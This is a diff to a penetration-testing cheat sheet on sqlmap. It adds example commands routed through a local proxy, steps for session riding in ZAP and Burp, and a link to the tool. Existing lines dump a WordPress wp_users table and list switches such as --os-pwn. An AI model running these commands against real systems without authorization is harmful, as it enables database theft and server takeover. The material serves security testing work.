@@ -7,7 +7,8 @@ order: 98
 > **SQLMap Command**
 
 {% highlight bash %}
-sqlmap.py -u "url" --cookie="cookie" --proxy "proxy"  --batch
+sqlmap.py -u http://site/file.php?variable?name=vName --cookie="cookie" --proxy http://127.0.0.1:8081   --batch
+sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 
 
 #Count Rows
 ./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 --count -D sqli -T Customers
@@ -20,12 +21,23 @@ sqlmap.py -I rawrequest2.raw --tables
 sqlmap.py -l rawrequest2.raw --dump -D wordpress -T wp_users
 {% endhighlight %}
 
+> **Riding Sessions**
+*Note: This can have a performance impact*
+
+**ZAP**
+1. Click enable session tracking cookies
+
+**Burp**
+1. Click Options tab
+2. Click Sessions sub-tab
+3. Click Use cookies from Burps' cookie jar - Proxy, Spider, and Scanner
+
 > **SQL Map Switches**
 
 **Common switches:**
 
 Discover SQL injection | <code> -u </code> 
-Spider the site | <code> --crawl </code> 
+Spider the site looking for injection points | <code> --crawl </code> 
 Target forms for injection | <code> --forms </code>
 Tell sqlmap the database | <code> --dbms </code> 
 Capture HTTP Request or proxy log as starting point | <code> -r/-l </code> 
@@ -83,4 +95,8 @@ OS Pwn | <code> --os-pwn </code>
 2. Right click on request in history -> run application -> SQLMap
 3. Right click on request in history -> view note
 4. Set up for each function you do frequently (e.g., tables, count, read file) 
+
+
+> **Tools**
+* [SQLMap](https://github.com/sqlmapproject/sqlmap)
 
